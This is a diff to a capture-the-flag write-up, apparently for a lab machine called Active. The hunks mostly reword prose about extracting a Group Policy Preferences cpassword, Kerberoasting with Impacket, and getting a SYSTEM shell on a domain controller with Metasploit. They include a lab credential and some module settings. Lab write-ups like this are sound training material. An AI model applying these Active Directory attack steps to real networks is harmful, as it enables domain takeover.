@@ -82,7 +82,7 @@ From them, we know:
 
 **Group Policy Preferences (GPP)** was introduced in Windows Server 2008, and among many other features, allowed administrators to modify users and groups across their network.
 
-Group Policy Preferences is a collection of Group Policy client-side extensions that deliver preference settings to domain-joined computers running Microsoft Windows desktop and server operating systems. Preference settings are administrative configuration choices deployed to desktops and servers. Preference settings differ from policy settings because users have a choice to alter the administrative configuration. Policy settings administratively enforce setting, which restricts user choice.
+**Group Policy Preferences** is a collection of Group Policy client-side extensions that deliver preference settings to domain-joined computers running Microsoft Windows desktop and server operating systems. Preference settings are administrative configuration choices deployed to desktops and servers. Preference settings differ from policy settings because users have a choice to alter the administrative configuration. Policy settings administratively enforce setting, which restricts user choice.
 
 ![GPP](./Screenshots/activegpp.png)
 
@@ -90,7 +90,7 @@ Group Policy Preferences is a collection of Group Policy client-side extensions 
 
 What are we gonna do now, is to extract the `encrypted password` from our `Groups.xml` file and decrypt it.
 
-The password is:
+The password hash is:
 
 ```
 edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
@@ -178,7 +178,7 @@ Let's check if we can find any `kerberoastable` users.
 
 ### Impacket
 
-**Impacket**’s **GetUserSPNs.py** lets us request the **TGS** and extract the hash for offline cracking.
+**Impacket**’s **GetUserSPNs.py** lets us request the **TGS** and extract the hash to futher offline cracking.
 
 ![PE](./Screenshots/activepe2.png)
 
@@ -218,7 +218,13 @@ Administrator:Ticketmaster1968
 
 ### Metasploit
 
-Time to log in as **Administrator**. For me the fastest and most pleasant way is to do it with **Metasploit**.
+Time to log in as **Administrator**. 
+
+We have admin's password, so we can use **Impacket**’s **psexec.py** to get a **system shell** on the **Domain Controler**.
+
+Gaining **system shell** access on a **Domain Controller** means taking full control of the server with the highest level of privileges, we will have complete access to the entire domain and all resources managed by it. This is the most **critical** level of access anyone can achieve within a `Windows` network.
+
+For me the fastest and most pleasant way was to do it with **Metasploit**.
 
 In order:
 
@@ -237,7 +243,6 @@ set rhost {target ip}
 ```
 set lhost {yout tun0 ip}
 ```
-`ip a | grep tun0` or `ifconfig`
 
 ```
 set smbuser Administrator
